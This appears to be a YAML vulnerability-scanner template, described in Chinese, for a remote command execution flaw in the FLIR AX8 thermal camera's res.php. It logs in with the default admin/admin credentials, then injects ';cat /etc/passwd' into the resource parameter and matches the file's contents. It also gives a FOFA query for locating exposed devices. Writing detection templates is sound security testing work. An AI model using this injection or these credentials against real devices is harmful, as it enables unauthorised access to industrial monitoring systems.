expression: r0() && r1()
id: flir-ax8-res-php-rce
info:
  author: daffainfo
  description: "FLIR AX8\u5C06\u7EA2\u5916\u70ED\u50CF\u4EEA\u3001\u53EF\u89C1\u5149\
    \u76F8\u673A\u96C6\u6210\u5165\u4E00\u79CD\u7ED3\u6784\u5C0F\u5DE7\u3001\u7ECF\
    \u6D4E\u5B9E\u60E0\u7684\u67B6\u6784\u4E2D\uFF0C\u4E3A\u5173\u952E\u673A\u7535\
    \u8BBE\u5907\u7684\u65E0\u95F4\u65AD\u72B6\u6001\u76D1\u63A7\u63D0\u4F9B\u8FDE\
    \u7EED\u7684\u6E29\u5EA6\u76D1\u63A7\u62A5\u8B66\u3002FLIR AX8\u7CFB\u7EDF\u5B58\
    \u5728\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\
    \u901A\u8FC7\u6F0F\u6D1E\u53EF\u4EE5\u83B7\u53D6\u670D\u52A1\u5668\u6743\u9650\
    \u3002\nfofa-query: app=\"FLIR-FLIR-AX8\"\n"
  name: "FLIR-AX8 res.php \u540E\u53F0\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E"
  reference:
  - https://mp.weixin.qq.com/s/KT3vLg49I61_j6Q7Rx6Mhg
  severity: critical
  verified: true
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b'"success"')
    request:
      body: user_name=admin&user_password=admin
      method: POST
      path: /login/dologin
  r1:
    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
    request:
      body: action=node&resource=;cat /etc/passwd
      method: POST
      path: /res.php
